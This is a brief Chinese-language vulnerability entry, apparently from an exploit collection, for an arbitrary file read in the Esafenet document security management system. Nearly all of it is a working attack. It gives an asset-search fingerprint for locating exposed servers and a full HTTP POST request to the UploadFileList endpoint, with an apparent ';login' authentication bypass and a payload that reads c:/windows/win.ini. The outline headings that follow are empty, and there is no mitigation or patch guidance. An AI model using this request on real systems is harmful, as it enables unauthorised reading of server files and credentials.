# 亿赛通电子文档安全管理系统UploadFileList存在任意文件读取漏洞

- **系统**：亿赛通电子文档安全管理系统　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name="ESAFENET 亿赛通文档安全管理系统"`
- **请求**：`POST /CDGServer3/document/UploadFileList;login HTTP/1.1`
- **关键头**：`Host: 192.168.31.24:8090`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 68`

**请求体 / payload**
```
command=VeiwUploadFile&filePath=c:/windows/win.ini&fileName1=111
```

**其他**
- 亿赛通电子文档安全管理系统UploadFileList存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 亿赛通电子文档安全管理系统